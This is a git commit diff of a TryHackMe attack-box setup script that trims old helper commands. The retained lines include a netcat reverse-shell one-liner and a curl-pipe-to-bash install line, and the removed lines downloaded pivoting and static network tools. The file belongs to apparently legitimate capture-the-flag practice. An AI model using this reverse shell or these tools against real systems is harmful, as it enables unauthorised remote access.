97d79a7e62876d07570758f70b2cb6eb2f0e9c64
Christopher Pritchard <chris@grislygrotto.nz>
2023-11-05 09:28:05 +1300

    trimmed out old commands

--- thm-setup.sh
+++ thm-setup.sh
@@ -4,7 +4,7 @@ echo "-- THM attack box setup --"
 # intended to be copy pasted into the shell, or run in one command via:
 #   curl -s https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/thm-setup.sh | bash
 
-echo "linking wordlists locally (rockyou.txt and dirwordlist.txt)"
+echo "linking wordlists locally (rockyou.txt, dirwordlist.txt and filewordlist.txt)"
 ln -s /usr/share/wordlists/rockyou.txt rockyou.txt
 (grep -v "#" /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt) | sort | uniq -u > dirwordlist.txt
 (grep -v "#" /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt) | sort | uniq -u > filewordlist.txt
@@ -17,28 +17,11 @@ echo "rustscan.sh"
 echo "docker run -it --rm --name rustscan rustscan/rustscan:latest -a \$1 -- -A" > rustscan.sh
 chmod +x rustscan.sh
 
-echo "chisel download scripts"
-echo "wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz && gunzip chisel_1.7.6_linux_amd64.gz && mv chisel_1.7.6_linux_amd64 chisel && chmod +x chisel" > get-chisel-linux.sh
-chmod +x get-chisel-linux.sh
-echo "wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz && gunzip chisel_1.7.6_windows_amd64.gz && mv chisel_1.7.6_windows_amd64 chisel.exe" > get-chisel-windows.sh
-chmod +x get-chisel-windows.sh
-
-echo "static binary (ncat, nmap, socat) download scripts"
-echo "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" > get-static-binaries.sh
-chmod +x get-static-binaries.sh
-
 echo "nc-rev: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(hostname -i) 4444 >/tmp/f"
-
-echo "chattr alternative for koth (mf.c and mf)"
-wget -q https://gist.githubusercontent.com/ChrisPritchard/05d98e1d195bc255b30674c8ce0fec50/raw/d5f02539ff892b83d1079284553f052b316793a7/mf.c -O mf.c && gcc -static -o mf mf.c && rm mf.c
 
 ssh-keygen -t ed25519 -P "" -f "/root/.ssh/id_ed25519" > /dev/null
 echo "ssh public key is:"
 cat .ssh/id_ed25519.pub
-
-echo "update-go.sh script"
-echo "wget -q https://go.dev/dl/go1.18.linux-amd64.tar.gz && rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.linux-amd64.tar.gz && rm go1.18.linux-amd64.tar.gz" > update-go.sh
-chmod +x update-go.sh
 
 echo "grabbing pspy64"
 wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
